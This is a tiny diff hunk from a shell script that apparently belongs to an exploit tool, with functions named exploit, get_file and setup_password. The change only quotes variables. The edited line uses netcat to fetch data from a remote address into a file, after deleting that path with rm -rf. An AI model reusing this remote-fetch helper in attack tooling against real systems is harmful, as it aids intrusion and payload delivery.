@@ -13,7 +13,7 @@ exploit() {
 
 get_file() {
     rm -rf "$2"
-    echo "$1" | nc $REMOTE_ADDR "$QUERY_STRING" >"$2"
+    echo "$1" | nc "${REMOTE_ADDR}" "${QUERY_STRING}" >"$2"
 }
 
 setup_password() {
